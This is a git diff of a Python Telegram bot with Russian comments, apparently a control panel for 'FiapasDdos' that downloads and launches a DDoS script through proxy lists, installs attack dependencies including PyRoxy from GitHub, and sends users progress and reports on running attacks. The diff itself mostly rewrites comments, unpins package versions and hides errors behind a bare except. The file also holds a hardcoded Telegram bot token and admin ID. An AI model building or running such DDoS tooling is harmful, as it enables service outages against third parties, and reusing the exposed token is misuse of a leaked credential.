@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-FiapasDdos БОТ — УПРАВЛЕНИЕ АТАКАМИ (ПРОГРЕСС РЕДАКТИРУЕТСЯ)
+FIAPASDDOS БОТ — УПРАВЛЕНИЕ АТАКАМИ (ПРОГРЕСС РЕДАКТИРУЕТСЯ)
 """
 
 import asyncio
@@ -31,7 +31,6 @@ from aiohttp import web
 BOT_TOKEN = "8984259381:AAHAc-dorORjD-G0Ci2lLnwf_kbbzqqCxkg"
 ADMINS = [8264264137]
 
-# Путь к start.py (FiapasDdos)
 DDOS_SCRIPT = "start.py"
 PROXIES_FILE = "proxies.txt"
 DATA_FILE = "users.json"
@@ -47,7 +46,7 @@ dp = Dispatcher()
 user_data = {}
 
 # ==============================
-# АВТОЗАГРУЗКА FiapasDdos И УСТАНОВКА ВСЕХ ЗАВИСИМОСТЕЙ
+# АВТОЗАГРУЗКА FIAPASDDOS И УСТАНОВКА ЗАВИСИМОСТЕЙ
 # ==============================
 def ensure_ddos_script():
     if os.path.exists(DDOS_SCRIPT):
@@ -75,15 +74,14 @@ def ensure_ddos_script():
 
 def install_dependencies():
     packages = [
-        "cloudscraper==1.2.71",
-        "certifi==2024.7.4",
-        "dnspython==2.6.1",
-        "requests==2.33.0",
-        "impacket==0.10.0",
-        "psutil>=5.9.3",
-        "icmplib>=2.1.1",
-        "pyasn1==0.6.3",
-        "yarl>=1.7.2",
+        "cloudscraper",
+        "dnspython",
+        "icmplib",
+        "aiohttp",
+        "beautifulsoup4",
+        "pycryptodome",
+        "psutil",
+        "requests",
         "https://github.com/MatrixTM/PyRoxy/archive/refs/heads/master.zip"
     ]
     for pkg in packages:
@@ -291,7 +289,7 @@ async def safe_answer(callback, text=None, show_alert=False):
             raise
 
 # ==============================
-# КЛАВИАТУРЫ (Inline)
+# КЛАВИАТУРЫ
 # ==============================
 def main_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -436,7 +434,7 @@ def confirm_menu():
     ])
 
 # ==============================
-# ОТПРАВКА СООБЩЕНИЙ (без редактирования, только для старта)
+# ОТПРАВКА СООБЩЕНИЙ
 # ==============================
 async def send_new(message, text, parse_mode="HTML", reply_markup=None):
     try:
@@ -792,7 +790,7 @@ async def monitor_attack(user_id):
         if time.time() - last_update >= 5:
             progress = min(100, int(elapsed / duration * 100))
             try:
-                # Редактируем сообщение вместо отправки нового
+                # РЕДАКТИРУЕМ сообщение
                 await msg.edit_text(
                     f"🚀 <b>Атака выполняется</b>\n\n"
                     f"🎯 Метод: {html.escape(data['method'])}\n"
@@ -805,8 +803,8 @@ async def monitor_attack(user_id):
                     parse_mode="HTML",
                     reply_markup=main_menu()
                 )
-            except Exception as e:
-                print(f"Ошибка редактирования прогресса: {e}")
+            except:
+                pass
             last_update = time.time()
         await asyncio.sleep(1)
     stdout, stderr = process.communicate()
@@ -826,7 +824,7 @@ async def monitor_attack(user_id):
     with open(filename, "w", encoding="utf-8") as f:
         f.write(report_text)
     try:
-        # Сначала редактируем сообщение, что атака завершена
+        # Редактируем сообщение о завершении
         await msg.edit_text(
             f"✅ <b>Атака завершена!</b>\n\n"
             f"📄 Отчёт приложен в виде файла.",
@@ -841,7 +839,7 @@ async def monitor_attack(user_id):
             reply_markup=main_menu()
         )
     except Exception as e:
-        # Если файл не отправился, выводим текст в редактируемое сообщение
+        # Если файл не отправился, выводим текст
         await msg.edit_text(
             f"✅ <b>Атака завершена!</b>\n\n"
             f"📄 <b>Отчёт:</b>\n"
